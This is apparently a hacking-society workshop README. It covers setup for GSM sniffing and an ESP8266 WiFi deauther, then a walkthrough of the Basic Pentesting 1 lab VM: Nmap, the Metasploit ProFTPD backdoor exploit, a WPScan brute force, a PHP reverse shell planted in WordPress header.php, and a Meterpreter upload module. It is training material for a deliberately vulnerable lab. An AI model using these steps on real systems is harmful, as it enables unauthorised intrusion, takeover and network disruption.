# hacksoc28.3.19
All the details of my presentation for those that fall behind

Pre-requisites for the workshop(software)

Any Linux distro 

Arduino IDE (https://www.arduino.cc/en/main/software)

Wireshark (sudo apt-get install wireshark)(Ubuntu/Debian based) 

Python

## GR-GSM(This requires an SDR and some time to compile)
```
sudo apt-get update && \
sudo apt-get install -y \
    cmake \
    autoconf \
    libtool \
    pkg-config \
    build-essential \
    python-docutils \
    libcppunit-dev \
    swig \
    doxygen \
    liblog4cpp5-dev \
    python-scipy \
    python-gtk2 \
    gnuradio-dev \
    gr-osmosdr \
    libosmocore-dev   
```
## Download GR-gsm and compile with (https://github.com/ptrkrysik/gr-gsm)
```
git clone https://git.osmocom.org/gr-gsm
cd gr-gsm
mkdir build
cd build
cmake ..
mkdir $HOME/.grc_gnuradio/ $HOME/.gnuradio/
make
sudo make install
sudo ldconfig
```
## Wifi Deauthentication using ESP8266
(I will provide 4 Nodemcu's you can play around which are pre configured ) 
First we need to flash the NodeMcu using this tutorial (easier to follow the link)
https://github.com/spacehuhn/esp8266_deauther/wiki/Installation


## Pentest part 
This pen test will cover tools like

Nmap
ZAP
metasploit

You are more than welcome to download the Vm and run this on your machine 
https://www.vulnhub.com/entry/basic-pentesting-1,216/


Firstly open up Kali linux or any linux machine 



lets run an Nmap scan on the target machine(you can easily get this since the Vm has a gui by going to connection information)

```
nmap -p- -sS -Pn -n -vvv -oA nmap-host-ports <machine-ip>
```
For demostration purposes i will be using openVas to show some of the vulnabilities

We can see that port 21,22,80 are open
(using openVas we can see that port 21 is exploitable)

This looks promising. Let’s try to exploit it with Metasploit.
```
msfconsole
search ProFTPD
use exploit/unix/ftp/proftpd_133c_backdoor
```


Bingo! Found something. Let’s set the target’s IP.

```
set RHOST xxx.xxx.xxx.xxx
```

And run the exploit.

```
run
whoami
```

Fantastic WE JUST GAINED ROOT ACCESS 

Now that we have gained root access lets dig a little deeper and find some more fancy stuff!


{we can skip this step since we already used Nmap but lets explore the GUI version}
Start up Zenmap and scan against the target IP

It revealed a couple of open ports:

    21 – ProFTPD (What we already exploited)
    22 – OpenSSH
    80 – HTTP with Apache
    
Now try and open the Targets IP address with a web browser 

Now open up your terminal again and start up a uniscan 
Scan the given URL (-u http://<target-ip>) for vulnerabilities, enabling directory and dynamic checks (-qd):
    
```
uniscan -u http://<target-ip> -qd 
```
Interesting. This reveals a URL that we might want to have a deeper look at.

<Taget-ip>/sercet/
    
Also, some external hosts were found:
https://www.ceos3c.com/wp-content/uploads/2018/03/2018-03-23-10_08_44.png

And a test of http://<target-ip>/secret/wp-login.php reveals a WP-Login page. Bingo! Now the fun can begin.
    
Alright, we are a big step further now. The first thing I want to do now is run  WPScan against the site to enumerate potential users and find potential vulnerabilities.

```
wpscan --url http://<taget-ip>/secret/
```

The WPScan discovers a couple of vulnerabilities:

    WordPress 2.8.6-4.9 – Authenticated JavaScript File Upload – CVE-2017-17092
    WordPress 1.5.0-4.9 – RSS and Atom Feed Escaping – CVE-2017-17094
    WordPress 4.3.0-4.9 – HTML Language Attribute Escaping – CVE-2017-17093
    WordPress 3.7-4.9 – ‘newbloguser’ Key Weak Hashing – CVE-2017-17091
    WordPress 3.7-4.9.1 – MediaElement Cross-Site Scripting (XSS) – CVE-2018-5776
    WordPress <= 4.9.4 – Application Denial of Service (DoS) (unpatched) – CVE-2018-6389
    
    
 But first, let’s run a user enumeration with WPScan.
 ```
 wpscan --url http://192.168.1.111/secret/ --enumerate u
 ```
 Admin as a username… Why not try admin/admin? Huh? Entering Username and Password redirects us somewhere else, a domain.
 
 That’s weird. Let’s figure out what’s up with that.

All links on the “Secret Blog” redirect to a domain named vtcsec, leaving us with a blank page. So if we want to click on a link on the Secret Blog, we get redirected, for example, to http://vtcsec/secret/index.php/2017/11/16/hello-world/

However, if we replace http://vtcsec/ with http://192.168.1.111/secret/index.php/2017/11/16/hello-word/ we are able to access the site. 

Now to be able to run a brute-force attack against the WordPress site without error, we need to add 192.168.1.111 pointing to vtcsec into our hosts file.

```
nano /etc/hosts
```
https://www.ceos3c.com/wp-content/uploads/2018/03/2018-03-23-14_30_13.png

We can verify if that worked by clicking on a link on the http://<target-ip>/secret/ site again. And there we go, hit F5 to refresh the page and it starts loading correctly.
We now have access to the Admin Dashboard which gives us a host of new things to try.
    
    
But not so fast, what if the password wouldn’t have been admin/admin? We could have used wpscan to brute-force a couple of default passwords against it by running the command below.


```
wpscan --url http://vtcsec/secret/wp-login.php --username admin --wordlist /usr/share/wordlists/metasploit/http_default_pass.txt --wp-content-dir http://<target-ip>:80/secret/wp-content/ --threads 50

```

I used the http_default_pass.txt wordlist and it, sure enough, found the correct password as well.



(This part will not work in this example but is a proof of concept)
We are going to add malicious code to the header.php page. I went to /usr/share/webshells/php and copy the code of php-reverse-shell.php

On your Attacking Computer go to Places -> File System -> usr -> share -> webshells -> php and open php-reverse-shell.php

Copy all of it’s content:

Now I went to Appearance -> Editor -> Theme Header(header.php) in WordPress. I pasted the code at the bottom of the file and changed the IP to my attacking computer. You can delete the code that was in the file before. Also, I changed the port for good measure. Now I updated the file.

https://www.ceos3c.com/wp-content/uploads/2018/03/2018-03-26-10_29_32.png

Next, I need to start a listener on my attacking computer.

```
nc -lvp 443
```

Once that is done, you just open http://http://vtcsec/secret/ once more and you will see that we get a connection on our listener.

We are logged in as the www-data User.

# Using Metasploit to upload a malicious WordPress Plugin

The Metasploit Admin Shell Upload module sounds promising. Firing up Metasploit and configuring the module first.
```
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
````

set up every thing like so 
https://www.ceos3c.com/wp-content/uploads/2018/03/2018-03-26-14_20_19.png


Finally run by typing

```
exploit
```

And boom! We got a Meterpreter shell


# Using unix privilege escalation check to analyze the target








